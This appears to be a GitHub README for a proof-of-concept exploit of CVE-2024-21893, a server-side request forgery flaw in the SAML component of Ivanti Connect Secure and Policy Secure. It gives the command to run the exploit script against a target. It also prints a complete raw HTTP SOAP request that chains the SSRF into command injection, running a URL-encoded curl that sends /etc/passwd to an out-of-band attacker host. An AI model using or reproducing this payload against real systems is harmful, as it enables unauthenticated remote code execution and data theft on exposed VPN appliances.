CVE-2024-21893 is  server-side request forgery vulnerability in the SAML component of Ivanti Connect Secure (9.x, 22.x) and Ivanti Policy Secure (9.x, 22.x) and Ivanti Neurons for ZTA allows an attacker to access certain restricted resources without authentication.

run `python CVE-2024-21893.py -u target.com -a http://xxxxxxxxx.oastify.com`

![image](https://github.com/h4x0r-dz/CVE-2024-21893.py/assets/26070859/bec33c87-a6c7-4db3-aedc-5749e994c917)

![image](https://github.com/h4x0r-dz/CVE-2024-21893.py/assets/26070859/c38f93de-379b-4b76-8326-e66c019dfa2a)

### RCE 

```
POST /dana-ws/saml20.ws HTTP/1.1
Host: target.com
Accept: */*
Content-Type: text/xml
Content-Length: 934
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
	<soap:Body>
		<ds:Signature
		xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
			<ds:SignedInfo>
				<ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
				<ds:SignatureMethod Algorithm="http://www.w3.org/2000/09/xmldsig#rsa-sha1"/>
			</ds:SignedInfo>
			<ds:SignatureValue>qwerty</ds:SignatureValue>
			<ds:KeyInfo xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.w3.org/2000/09/xmldsig" xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
				<ds:RetrievalMethod URI="http://127.0.0.1:8090/api/v1/license/keys-status/%3bcurl%20-X%20POST%20-d%20%40%2fetc%2fpasswd%20http%3a%2f%2f8oxxxxxxxxxxxxx.oastify.com%3b"/>
				<ds:X509Data/>
			</ds:KeyInfo>
			<ds:Object></ds:Object>
		</ds:Signature>
	</soap:Body>
</soap:Envelope>

```

![image](https://github.com/h4x0r-dz/CVE-2024-21893.py/assets/26070859/e7d7180a-b158-4437-9dd9-97d4c55539c9)


Reference : https://attackerkb.com/topics/FGlK1TVnB2/cve-2024-21893/rapid7-analysis 
